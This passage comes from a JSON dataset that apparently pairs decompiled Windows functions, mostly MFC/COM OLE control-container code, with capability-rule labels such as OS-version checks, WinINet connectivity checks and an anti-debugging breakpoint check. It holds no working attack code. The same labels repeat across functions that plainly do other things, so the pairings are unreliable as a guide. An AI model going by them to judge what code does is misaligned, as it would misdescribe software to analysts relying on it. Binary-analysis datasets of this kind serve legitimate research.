0x20) = *(unaff_EBP + 0x20) + iVar8 * -2;\n        }\n    }\n    uVar7 = *0x449654;\n    *(unaff_EBP + -0x14) = 0;\n    *(unaff_EBP + -0x10) = uVar7;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x1c) = 0;\n    *(unaff_EBP + -0x20) = 0;\n    *(unaff_EBP + -0x24) = 0;\n    if ((*(unaff_EBP + 0x18) == 0x37a) || (*(unaff_EBP + 0x18) == 0x37b)) {\n        iVar8 = *piVar11;\n        piVar11 = piVar11 + 3;\n        *(unaff_EBP + -0x2c) = iVar8;\n        *(unaff_EBP + 0x1c) = iVar8 + -0xc;\n        piVar12 = piVar11;\n        if (iVar8 + -0xc != 0) {\n            do {\n                iVar8 = *piVar12;\n                uVar3 = *(piVar12 + 1);\n                *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + -6;\n                *(unaff_EBP + -0x28) = iVar8;\n                piVar11 = piVar12 + 6;\n                if (iVar8 == -0x7ffeffff) {\n                    *(unaff_EBP + -0x20) = *piVar11;\n                    iVar13 = piVar12 + 0x16;\n                    *(unaff_EBP + -0x24) = *(piVar12 + 10);\n                    fcn.0041d402();\n                    *(unaff_EBP + -0x1c) = uVar3;\n                    iVar8 = *(*(unaff_EBP + -0x10) + -8);\n                    *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + (-0x11 - iVar8);\n                    piVar11 = piVar12 + iVar8 + 0x17;\n                }\n                else {\n                    iVar8 = fcn.0041bd04(0x1c);\n                    *(unaff_EBP + -0x30) = iVar8;\n                    *(unaff_EBP + -4) = 1;\n                    if (iVar8 == 0) {\n                        uVar7 = 0;\n                    }\n                    else {\n                        iVar13 = *(unaff_EBP + -0x14);\n                        uVar7 = fcn.004097f7();\n                    }\n                    *(unaff_EBP + -4) = 0;\n                    *(unaff_EBP + -0x14) = uVar7;\n                }\n                piVar12 = piVar11;\n            } while (*(unaff_EBP + 0x1c) != 0);\n            iVar8 = *(unaff_EBP + -0x2c);\n        }\n        *(unaff_EBP + 0x20) = *(unaff_EBP + 0x20) - iVar8;\n        *(unaff_EBP + 0x18) = *(unaff_EBP + 0x18) + 0xfffc;\n    }\n    uVar7 = 0;\n    if (**(unaff_EBP + -0x18) == 0x7b) {\n        uVar9 = (*_sym.imp.ole32.dll_CLSIDFromString)();\n    }\n    else {\n        uVar9 = (*_sym.imp.ole32.dll_CLSIDFromProgID)(*(unaff_EBP + -0x18), unaff_EBP + -0x50, iVar13);\n    }\n    *(unaff_EBP + 0x1c) = uVar9;\n    fcn.00422f4b(piVar11, *(unaff_EBP + 0x20), 0);\n    iVar4 = *(unaff_EBP + 0x18);\n    *(unaff_EBP + -4) = 2;\n    *(unaff_EBP + 0x14) = 0;\n    if (((-1 < *(unaff_EBP + 0x1c)) && (iVar13 = fcn.004044d8(),  iVar13 != 0)) &&\n       (iVar13 = fcn.004046e6(0, unaff_EBP + -0x50, 0, *puVar14, unaff_EBP + -0x40, *(puVar14 + 4), \n                              -(iVar4 != 0x378) & unaff_EBP - 0x8cU, *(unaff_EBP + 0x18) == 0x377, *(unaff_EBP + 0x10), \n                              unaff_EBP + 0x14),  iVar13 != 0)) {\n        fcn.004060fc(1);\n        (*_sym.imp.USER32.dll_SetWindowPos)(*(*(unaff_EBP + 0x14) + 0x20), *(unaff_EBP + 0xc), 0, 0, 0, 0, 0x13);\n        *(*(unaff_EBP + 0x14) + 0x8c) = *(unaff_EBP + -0x14);\n        fcn.0041d3b2(unaff_EBP + -0x10);\n        *(*(unaff_EBP + 0x14) + 0x90) = *(unaff_EBP + -0x1c);\n        *(*(unaff_EBP + 0x14) + 0x94) = *(unaff_EBP + -0x20);\n        *(*(unaff_EBP + 0x14) + 0x98) = *(unaff_EBP + -0x24);\n    }\n    if (*(unaff_EBP + 0x10) != 0) {\n        (*_sym.imp.OLEAUT32.dll_SysStringLen)(*(unaff_EBP + 0x10));\n    }\n    if (*(unaff_EBP + 0x14) != 0) {\n        uVar7 = *(*(unaff_EBP + 0x14) + 0x20);\n    }\n    *(unaff_EBP + -4) = 0;\n    fcn.00422f87();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041d2bd();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar7;\n}\n",
        "token_count": 2420
    },
    "004044d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_14h\n\nbool fcn.004044d8(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_4h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h_2;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = &var_14h;\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    if (*(extraout_ECX + 0x34) == 0) {\n        iVar1 = fcn.00423ff7();\n        uVar2 = (**(**(iVar1 + 0x1038) + 8))(extraout_ECX);\n        *(extraout_ECX + 0x34) = uVar2;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    if ((*(extraout_ECX + 0x34) != 0) && (iVar1 = extraout_ECX,  extraout_ECX != 0)) {\n        while ((*(iVar1 + 0x24) & 0x100) == 0) {\n            *(iVar1 + 0x24) = *(iVar1 + 0x24) | 0x100;\n            uVar2 = (*_sym.imp.USER32.dll_GetParent)(*(iVar1 + 0x1c));\n            iVar1 = fcn.0041db42(uVar2);\n            iVar3 = iVar1;\n            if (iVar1 != 0) {\n                iVar3 = *(iVar1 + 0x1c);\n            }\n            uVar4 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar3, 0xfffffff0);\n            if (((uVar4 & 0x40000000) == 0) || (iVar1 == 0)) break;\n        }\n    }\n    iVar1 = *(extraout_ECX + 0x34);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar1 != 0;\n}\n",
        "token_count": 541
    },
    "00404608": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.00404608(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x1c) = extraout_ECX;\n    *extraout_ECX = vtable.COleControlContainer.0;\n    pcVar1 = extraout_ECX[0xb];\n    *(unaff_EBP + -4) = 1;\n    iVar2 = -(pcVar1 != NULL);\n    *(unaff_EBP + -0x10) = iVar2;\n    while (iVar2 != 0) {\n        fcn.0041ba8b();\n        if (*(*(unaff_EBP + -0x14) + 0x88) == 0) {\n            fcn.0041ba49();\n            if (*(unaff_EBP + -0x14) != NULL) {\n                (**(**(unaff_EBP + -0x14) + 4))(1);\n            }\n        }\n        iVar2 = *(unaff_EBP + -0x10);\n    }\n    iVar2 = -(extraout_ECX[0xb] != NULL);\n    *(unaff_EBP + -0x10) = iVar2;\n    while (iVar2 != 0) {\n        fcn.0041ba8b();\n        if (*(unaff_EBP + -0x14) != NULL) {\n            (**(**(unaff_EBP + -0x14) + 4))(1);\n        }\n        iVar2 = *(unaff_EBP + -0x10);\n    }\n    fcn.0041b8b8();\n    fcn.00425322(extraout_ECX + 0x11);\n    *(unaff_EBP + -4) = 0;\n    fcn.0041b8e3();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041c304();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 555
    },
    "00404c12": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404c12(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = -(*(in_ECX + 0x2c) != 0);\n    while (var_4h != 0) {\n        fcn.0041ba8b(&var_4h, &var_ch, &var_8h);\n        fcn.004060fc(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 125
    },
    "004054d6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nuint __cdecl\nfcn.004054d6(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint uVar7;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_38h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    iVar6 = *(unaff_EBP + 8);\n    extraout_ECX[8] = 0;\n    if (iVar6 != 0) {\n        extraout_ECX[9] = iVar6;\n        *(iVar6 + 0x38) = extraout_ECX;\n    }\n    iVar6 = fcn.00423dca();\n    if ((*(iVar6 + 0x114) == 0) && (iVar6 = fcn.00425074(),  iVar6 == 0)) {\n        uVar7 = 0x80004005;\n        goto code_r0x00405763;\n    }\n    iVar6 = fcn.004059d0(*(unaff_EBP + 0xc), *(unaff_EBP + 0x24), *(unaff_EBP + 0x28), *(unaff_EBP + 0x2c));\n    *(unaff_EBP + 8) = iVar6;\n    if (-1 < iVar6) {\n        extraout_ECX[10] = *(unaff_EBP + 0x20);\n        piVar2 = *(unaff_EBP + 0x1c);\n        if (piVar2 == NULL) {\n            fcn.0042215e(0);\n            piVar2 = extraout_ECX[0x13];\n            iVar6 = *piVar2;\n            *(unaff_EBP + -4) = 0;\n            (**(iVar6 + 0x48))(piVar2, 1, unaff_EBP + -0x14);\n            fcn.00423511(unaff_EBP + -0x14);\n            iVar6 = **(unaff_EBP + 0x18);\n            iVar3 = (*(unaff_EBP + 0x18))[1];\n            *(unaff_EBP + -0x24) = iVar6;\n            *(unaff_EBP + -0x1c) = iVar6 + *(unaff_EBP + -0x14);\n            *(unaff_EBP + -0x20) = iVar3;\n            *(unaff_EBP + -0x18) = *(unaff_EBP + -0x10) + iVar3;\n            *(unaff_EBP + -4) = 0xffffffff;\n            extraout_ECX[0xb] = *(unaff_EBP + -0x24);\n            extraout_ECX[0xc] = *(unaff_EBP + -0x20);\n            extraout_ECX[0xd] = *(unaff_EBP + -0x1c);\n            extraout_ECX[0xe] = *(unaff_EBP + -0x18);\n            fcn.004221d0();\n        }\n        else {\n            iVar6 = *piVar2;\n            iVar3 = **(unaff_EBP + 0x18);\n            iVar4 = (*(unaff_EBP + 0x18))[1];\n            *(unaff_EBP + -0x18) = piVar2[1] + iVar4;\n            *(unaff_EBP + -0x24) = iVar3;\n            *(unaff_EBP + -0x1c) = iVar6 + iVar3;\n            *(unaff_EBP + -0x20) = iVar4;\n            extraout_ECX[0xb] = *(unaff_EBP + -0x24);\n            extraout_ECX[0xc] = *(unaff_EBP + -0x20);\n            extraout_ECX[0xd] = *(unaff_EBP + -0x1c);\n            extraout_ECX[0xe] = *(unaff_EBP + -0x18);\n        }\n        extraout_ECX[0x1a] = 0x30000;\n        if ((extraout_ECX[0x1c] & 0x1000U) != 0) {\n            extraout_ECX[0x1a] = 0x30001;\n        }\n        if ((extraout_ECX[0x1c] & 0x400U) != 0) {\n            *(unaff_EBP + 0x17) = *(unaff_EBP + 0x17) & 0xef;\n        }\n        iVar6 = *(unaff_EBP + 8);\n        extraout_ECX[0x1b] = extraout_ECX[0x1a] & *(unaff_EBP + 0x14);\n        if (iVar6 != 1) {\n            iVar6 = fcn.00405d83(extraout_ECX + 0xf, extraout_ECX + 0x33);\n            extraout_ECX[0x18] = iVar6;\n            iVar6 = fcn.00405d83(0x42c3f8, extraout_ECX + 0x32);\n            extraout_ECX[0x19] = iVar6;\n        }\n        iVar6 = fcn.00405d83(0x42c3a8, extraout_ECX + 0x35);\n        extraout_ECX[0x21] = iVar6;\n        fcn.0040542e();\n        ppiVar1 = extraout_ECX + 0x14;\n        iVar6 = (***extraout_ECX[0x13])(extraout_ECX[0x13], 0x42c408, ppiVar1);\n        *(unaff_EBP + 8) = iVar6;\n        pcVar5 = _sym.imp.USER32.dll_OffsetRect;\n        if (iVar6 < 0) {\ncode_r0x004056d7:\n            piVar2 = *ppiVar1;\n            if (piVar2 != NULL) {\n                (**(*piVar2 + 8))(piVar2);\n                *ppiVar1 = NULL;\n            }\n            fcn.00405deb(extraout_ECX + 0xf, extraout_ECX[0x18]);\n            fcn.00405deb(0x42c3f8, extraout_ECX[0x19]);\n            fcn.00405deb(0x42c3a8, extraout_ECX[0x21]);\n            extraout_ECX[0x18] = 0;\n            extraout_ECX[0x19] = 0;\n            extraout_ECX[0x21] = 0;\n            (**(*extraout_ECX[0x13] + 8))(extraout_ECX[0x13]);\n            iVar6 = *(unaff_EBP + 8);\n            extraout_ECX[0x13] = 0;\n            if (iVar6 < 0) goto code_r0x0040575f;\n        }\n        else {\n            if ((*(unaff_EBP + 0x17) & 0x10) == 0) {\n                (*_sym.imp.USER32.dll_OffsetRect)(extraout_ECX + 0xb, 0xffff8300, 0xffff8300);\n                iVar6 = (**(*extraout_ECX + 0x54))(0xfffffffb, 0);\n                *(unaff_EBP + 8) = iVar6;\n                if (-1 < iVar6) {\n                    iVar6 = (**(*extraout_ECX + 0x54))(0xfffffffd, 0);\n                    *(unaff_EBP + 8) = iVar6;\n                    if (-1 < iVar6) {\n                        (*pcVar5)(extraout_ECX + 0xb, 32000, 32000);\n                        uVar7 = (**(**ppiVar1 + 0x1c))(*ppiVar1, extraout_ECX + 0xb, extraout_ECX + 0xb);\n                        *(unaff_EBP + 8) = uVar7;\n                        goto code_r0x004056c7;\n                    }\n                }\n                goto code_r0x004056d7;\n            }\n            uVar7 = (**(*extraout_ECX + 0x54))(0xfffffffb, 0);\n            *(unaff_EBP + 8) = uVar7;\ncode_r0x004056c7:\n            if (*(unaff_EBP + 8) < 0) goto code_r0x004056d7;\n            fcn.00405fc3();\n        }\n        fcn.00406132();\n        if (*(unaff_EBP + 0x10) != 0) {\n            (**(*extraout_ECX + 0x80))(*(unaff_EBP + 0x10));\n        }\n        (**(*extraout_ECX + 0x78))(0, *(unaff_EBP + 0x14) & 0x8800000 | extraout_ECX[0x1b], 0);\n    }\ncode_r0x0040575f:\n    uVar7 = *(unaff_EBP + 8);\ncode_r0x00405763:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar7;\n}\n",
        "token_count": 2183
    },
    "00405deb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405deb(uint arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    if ((arg_ch != 0) && (puVar1 = in_ECX[0x13],  puVar1 != NULL)) {\n        var_8h = in_ECX;\n        iVar2 = (***puVar1)(puVar1, 0x42c4a8, &var_8h);\n        if (-1 < iVar2) {\n            var_4h = NULL;\n            iVar2 = (**(*var_8h + 0x10))(var_8h, arg_8h, &var_4h);\n            if (-1 < iVar2) {\n                (**(*var_4h + 0x18))(var_4h, arg_ch);\n                (**(*var_4h + 8))(var_4h);\n            }\n            (**(*var_8h + 8))(var_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 258
    },
    "00405e49": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00405e49(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    *arg_8h = *0x42c4d8;\n    arg_8h[1] = *0x42c4dc;\n    arg_8h[2] = *0x42c4e0;\n    arg_8h[3] = *0x42c4e4;\n    var_ch = NULL;\n    iVar1 = (****(in_ECX + 0x4c))(*(in_ECX + 0x4c), 0x42c4c8, &var_ch);\n    if (-1 < iVar1) {\n        (**(*var_ch + 0x10))(var_ch, 1, arg_8h);\n        (**(*var_ch + 8))(var_ch);\n    }\n    var_14h = NULL;\n    iVar1 = fcn.0040b9f0(arg_8h, 0x42c4d8, 0x10);\n    if ((iVar1 == 0) && (iVar1 = (****(in_ECX + 0x4c))(*(in_ECX + 0x4c), 0x42c4b8, &var_14h),  -1 < iVar1)) {\n        var_4h = NULL;\n        iVar1 = (**(*var_14h + 0xc))(var_14h, &var_4h);\n        if (-1 < iVar1) {\n            iVar1 = (**(*var_4h + 0xc))(var_4h, &var_10h);\n            if (-1 < iVar1) {\n                uVar2 = 0;\n                if (*(var_10h + 0x30) != 0) {\n                    do {\n                        iVar1 = (**(*var_4h + 0x24))(var_4h, uVar2, &var_1ch);\n                        if ((-1 < iVar1) && ((var_1ch & 7) == 3)) {\n                            var_8h = NULL;\n                            iVar1 = (**(*var_4h + 0x20))(var_4h, uVar2, &var_20h);\n                            if ((-1 < iVar1) && (iVar1 = (**(*var_4h + 0x38))(var_4h, var_20h, &var_8h),  -1 < iVar1)) {\n                                iVar1 = (**(*var_8h + 0xc))(var_8h, &var_18h);\n                                if (-1 < iVar1) {\n                                    *arg_8h = *var_18h;\n                                    arg_8h[1] = var_18h[1];\n                                    arg_8h[2] = var_18h[2];\n                                    arg_8h[3] = var_18h[3];\n                                    (**(*var_8h + 0x4c))(var_8h, var_18h);\n                                }\n                                (**(*var_8h + 8))(var_8h);\n                            }\n                            break;\n                        }\n                        uVar2 = uVar2 + 1;\n                    } while (uVar2 < *(var_10h + 0x30));\n                }\n                (**(*var_4h + 0x4c))(var_4h, var_10h);\n            }\n            (**(*var_4h + 8))(var_4h);\n        }\n        (**(*var_14h + 8))(var_14h);\n    }\n    iVar1 = fcn.0040b9f0(arg_8h, 0x42c4d8, 0x10);\n    return iVar1 != 0;\n}\n",
        "token_count": 906
    },
    "0040616f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040616f(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = *(param_1 + 0x24);\n    *(param_1 + 0x20) = 0;\n    if (piVar1 != NULL) {\n        if (piVar1[7] != 0) {\n            piVar1 = (**(*piVar1 + 0x80))();\n            iVar2 = (*_sym.imp.USER32.dll_IsWindow)(*(*(param_1 + 0x24) + 0x1c));\n            if ((iVar2 != 0) && (*piVar1 != 0)) {\n                fcn.00420214();\n            }\n            fcn.0041dbc0();\n        }\n        *(*(param_1 + 0x24) + 0x38) = 0;\n    }\n    return;\n}\n",
        "token_count": 206
    },
    "0040746a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040746a(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    \n    if (*param_1 != NULL) {\n        fcn.00407499();\n        piVar1 = *param_1;\n        if (piVar1 != NULL) {\n            *param_1 = NULL;\n            (**(*piVar1 + 8))(piVar1);\n        }\n        piVar1 = param_1[1];\n        if (piVar1 != NULL) {\n            param_1[1] = NULL;\n            (**(*piVar1 + 8))(piVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 145
    },
    "00407aeb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00407aeb(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    iVar2 = 0;\n    uVar3 = 0;\n    uVar1 = *(*(param_1 + 8) + 4);\n    if (uVar1 != 0) {\n        do {\n            if ((*(**(param_1 + 8) + 4 + uVar3 * 8) != '\\0') && (iVar2 = fcn.00407b1f(uVar3),  iVar2 < 0)) {\n                return iVar2;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < uVar1);\n    }\n    return iVar2;\n}\n",
        "token_count": 183
    },
    "00407b57": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n\nint32_t fcn.00407b57(void)\n\n{\n    int16_t iVar1;\n    code **ppcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int32_t *extraout_ECX;\n    uint32_t arg_28h;\n    uint *puVar7;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    uint32_t uVar8;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint *noname_1;\n    uint uVar9;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    uint uStack4;\n    \n    uStack4 = 0x407b61;\n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = &fcn.00407b57::var_28h;\n    *(unaff_EBP + -0x28) = extraout_ECX;\n    *(unaff_EBP + -0x14) = 0;\n    puVar7 = *(unaff_EBP + 8);\n    uVar9 = 0x449ed8;\n    ppcVar2 = *puVar7;\n    *(unaff_EBP + -4) = 0;\n    noname_1 = puVar7;\n    var_28h = unaff_EDI;\n    var_24h = unaff_ESI;\n    iVar3 = (**ppcVar2)();\n    *(unaff_EBP + 8) = iVar3;\n    if (iVar3 < 0) {\n        piVar6 = *(unaff_EBP + -0x14);\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (piVar6 != NULL) {\n            (**(*piVar6 + 8))(piVar6);\n        }\n        iVar3 = *(unaff_EBP + 8);\n        goto code_r0x00407df7;\n    }\n    iVar3 = extraout_ECX[4];\n    *(unaff_EBP + 8) = 0;\n    if (iVar3 == 0) {\n        *(unaff_EBP + -0x1c) = 0;\n        ppcVar2 = *puVar7;\n        *(unaff_EBP + -4) = 1;\n        iVar3 = (**ppcVar2)(puVar7, 0x449ec8, unaff_EBP + -0x1c);\n        if ((-1 < iVar3) &&\n           (iVar3 = (**(**(unaff_EBP + -0x1c) + 0xc))\n                              (*(unaff_EBP + -0x1c), extraout_ECX + 3, extraout_ECX + 4, extraout_ECX + 5),  -1 < iVar3)\n           ) {\n            piVar6 = *(unaff_EBP + -0x1c);\n            *(extraout_ECX + 6) = 0;\n            *(unaff_EBP + -4) = 0;\n            if (piVar6 != NULL) {\n                (**(*piVar6 + 8))(piVar6);\n            }\n            goto code_r0x00407c1d;\n        }\n        piVar6 = *(unaff_EBP + -0x1c);\n        *(unaff_EBP + -4) = 0;\n        if (piVar6 != NULL) {\n            (**(*piVar6 + 8))(piVar6);\n        }\ncode_r0x00407de4:\n        piVar6 = *(unaff_EBP + -0x14);\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (piVar6 != NULL) {\n            (**(*piVar6 + 8))(piVar6);\n        }\n    }\n    else {\n        *(extraout_ECX + 6) = 1;\ncode_r0x00407c1d:\n        iVar3 = extraout_ECX[3];\n        *(unaff_EBP + -0x18) = 0;\n        *(unaff_EBP + -4) = 2;\n        uVar4 = fcn.0041bd04(iVar3 * 0x34);\n        *(unaff_EBP + -0x18) = uVar4;\n        uVar8 = 0;\n        *(unaff_EBP + -4) = 0;\n        if (*(unaff_EBP + -0x18) == 0) {\n            piVar6 = *(unaff_EBP + -0x14);\n            *(unaff_EBP + -4) = 0xffffffff;\n        }\n        else {\n            *(unaff_EBP + -0x24) = *(unaff_EBP + -0x18);\n            *(unaff_EBP + -0x20) = 0;\n            while (uVar8 < extraout_ECX[3]) {\n                iVar3 = uVar8 * 0x30;\n                if ((*(extraout_ECX[4] + iVar3 + 0x10) < 0x401) && (*(extraout_ECX[4] + iVar3 + 0x14) != 0xd)) {\n                    puVar7 = NULL;\n                }\n                else {\n                    *(unaff_EBP + -0x2c) = 0;\n                    *(unaff_EBP + -4) = 4;\n                    puVar7 = fcn.0041bd04(0x14);\n                    *(unaff_EBP + -4) = 0;\n                    if (puVar7 == NULL) goto code_r0x00407dac;\n                    *puVar7 = 0;\n                    puVar7[1] = str.0:s_f._0_4_;\n                    puVar7[2] = *0x42c8b4;\n                    puVar7[3] = *0x42c8b8;\n                    puVar7[4] = *0x42c8bc;\n                    iVar3 = *(unaff_EBP + -0x20) * 0x30;\n                    *(extraout_ECX[4] + 0x14 + iVar3) = 0xd;\n                    *(extraout_ECX[4] + 0x10 + iVar3) = 4;\n                }\n                iVar1 = *(extraout_ECX[4] + iVar3 + 0x14);\n                if ((iVar1 == 0x81) || (iVar1 == 0x82)) {\n                    piVar6 = extraout_ECX[4] + iVar3 + 0x10;\n                    *piVar6 = *piVar6 + 1;\n                }\n                iVar5 = extraout_ECX[4] + iVar3;\n                arg_28h = (*(iVar5 + 0x10) & 3) + *(iVar5 + 0x10) + *(unaff_EBP + 8);\n                fcn.00407eae(*(unaff_EBP + -0x24), *(iVar5 + 8), arg_28h & 0xffff0000 | *(iVar5 + 0x14), *(iVar5 + 0x10)\n                             , arg_28h & 0xffffff00 | *(iVar5 + 0x16), arg_28h & 0xffffff00 | *(iVar5 + 0x17), 0, \n                             *(unaff_EBP + 8), arg_28h, arg_28h + 4, puVar7);\n                iVar5 = extraout_ECX[4];\n                *(unaff_EBP + -0x24) = *(unaff_EBP + -0x24) + 0x34;\n                *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 1;\n                *(iVar5 + 4 + iVar3) = *(unaff_EBP + 8);\n                uVar8 = *(unaff_EBP + -0x20);\n                *(unaff_EBP + 8) = arg_28h + 8;\n            }\n            if (*extraout_ECX == 0) {\n                iVar3 = fcn.00407e08(1, noname_1, uVar9, unaff_EBP + -0x14, var_28h, var_24h);\n                if (iVar3 < 0) {\n                    fcn.0041bd2d(*(unaff_EBP + -0x18));\n                    goto code_r0x00407de4;\n                }\n                *(*extraout_ECX + 4) = 1;\n            }\n            uVar9 = *(unaff_EBP + 8);\n            extraout_ECX[2] = 0;\n            *(unaff_EBP + -4) = 6;\n            iVar3 = fcn.0041bd04(uVar9);\n            extraout_ECX[2] = iVar3;\n            *(unaff_EBP + -4) = 0;\n            if (extraout_ECX[2] != 0) {\n                iVar3 = fcn.00407e64(*(unaff_EBP + -0x18), extraout_ECX[3], *extraout_ECX, *(unaff_EBP + 8), \n                                     *(unaff_EBP + -0x14));\n                fcn.0041bd2d(*(unaff_EBP + -0x18));\n                goto code_r0x00407de4;\n            }\n            fcn.0041bd2d(*(unaff_EBP + -0x18));\ncode_r0x00407dac:\n            piVar6 = *(unaff_EBP + -0x14);\n            *(unaff_EBP + -4) = 0xffffffff;\n        }\n        if (piVar6 != NULL) {\n            (**(*piVar6 + 8))(piVar6);\n        }\n        iVar3 = -0x7ff8fff2;\n    }\ncode_r0x00407df7:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar3;\n}\n",
        "token_count": 2322
    },
    "004080d5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
